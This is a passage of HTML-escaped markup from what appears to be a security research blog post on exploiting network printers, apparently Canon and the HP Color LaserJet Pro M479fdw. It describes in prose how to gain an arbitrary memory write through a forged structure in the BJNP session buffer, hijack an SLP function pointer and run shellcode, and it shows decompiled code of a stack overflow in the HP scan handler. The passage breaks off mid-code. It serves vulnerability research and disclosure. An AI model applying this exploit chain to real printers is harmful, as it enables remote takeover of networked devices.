    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2396&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2372&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt;, it will overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response_buf-&amp;gt;id&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nbinfo-&amp;gt;id&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;That is, if we can overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; structure and forge the structure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;, we can do arbitrary memory writing. We need to find a global buffer to forge the structure. We finally chose BJNP session buffer as our target. It will copy our payload when we start a BJNP session.&lt;/p&gt;

&lt;p&gt;After we have arbitrary memory writing. We can overwrite the function pointer of SLP service with BJNP session buffer pointer.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_4159CF90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_45C8FF14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// SLP function&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It does not implement DEP. After overwriting the function pointer, we can use the BJNP session buffer again to put our shellcode. After that, we can use the SLP attribute request to control the PC and run our shellcode.&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;Our target this time is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HP Color LaserJet Pro M479fdw&lt;/code&gt; printer, which is primarily Linux-based. This makes the analysis relatively simpler. Under the Web Service, there are numerous ‚Äòcgi‚Äô files providing various printer operations. These operate via the FastCGI method. You can refer to the nginx config to see which path corresponds to which port and service. The config can be found at rootfs/sirius/rom/httpmgr_nginx.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Sirius/rom/httpmgr_nginx/ledm.conf&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20231106/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/local/slanapp&lt;/code&gt; is responsible for handling scan-related operations and primarily listens on 127.0.0.1:14030.&lt;/p&gt;

&lt;p&gt;We can see from rootfs/sirius/rom/httpmgr_nginx/rest_scan.conf :
&lt;img src=&quot;/assets/img/blog/20231106/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we access /Scan/Jobs, the request is forwarded to a FastCGI listening on the 14030 port. After analysis, we found that it was handled by /rootfs/usr/local/bin/slangapp. When we send a request to /Scan/Jobs, it will call scan_job_http_handler in slangapp.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There is a stack overflow at rest_scan_handle_get_request in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slangapp&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan_job_http_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+14h] [bp-2Ch]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-28h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+20h] [bp-20h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+30h] [bp-10h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+38h] [bp-8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+40h] [bp+0h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+44h] [bp+4h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+C8h] [bp+88h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x81u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_5DBD0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acceptRequestHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getURI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1193517589&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_7:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getVerb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getContentLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span 